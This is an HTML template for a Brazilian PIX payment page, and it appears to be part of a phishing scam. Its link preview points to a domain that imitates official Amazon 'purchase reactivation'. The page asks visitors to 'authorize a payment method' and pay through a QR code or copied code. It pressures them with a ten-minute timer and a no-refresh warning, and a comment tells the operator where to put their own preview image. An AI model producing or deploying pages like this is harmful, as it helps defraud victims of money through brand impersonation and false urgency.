<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, viewport-fit=cover"
  >

  <meta name="theme-color" content="#edbb81">

  <title>Pagamento PIX</title>

  <!-- PRÉVIA DO LINK -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Pagamento PIX">
  <meta
    property="og:description"
    content="Acesse para realizar o pagamento."
  >

  <!--
    QUANDO TIVER SUA IMAGEM DE PRÉVIA,
    COLOQUE O LINK PÚBLICO DELA AQUI.
  -->
  <meta
    property="og:image"
    content="https://amazon-reativacao-de-compra-oficial.onrender.com/logo-previa.jpg"
  >

  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <link rel="stylesheet" href="style.css">
</head>

<body>

  <!-- CABEÇALHO -->
  <header class="header">
    <h1>Autorizar forma de pagamento</h1>
  </header>

  <!-- FAIXA ESCURA -->
  <div class="dark-bar"></div>

  <!-- PAGAMENTO -->
  <main class="payment">

    <h2 id="amount" class="amount">
      Total a pagar: R$ 0,00
    </h2>

    <div id="qrcode" class="qrcode"></div>

    <h2 class="instructions-title">
      Escaneie ou copie o código para pagar
    </h2>

    <p class="instructions">
      Escaneie o QR code com a câmera do seu celular
      <br>
      para pagar no aplicativo do seu banco ou copie o
      <br>
      código clicando no botão abaixo.
    </p>

    <p class="no-refresh">
      Não atualize a página.
    </p>

    <p class="remaining">
      Tempo restante:
      <strong id="timer">10:00</strong>
    </p>

    <button
      id="copyButton"
      class="copy-button"
      type="button"
    >
      Copiar código
    </button>

    <p id="copyStatus" class="copy-status"></p>

  </main>

  <!-- GERADOR DO QR CODE -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>

  <!-- SEU SCRIPT -->
  <script src="script.js"></script>

</body>
</html>
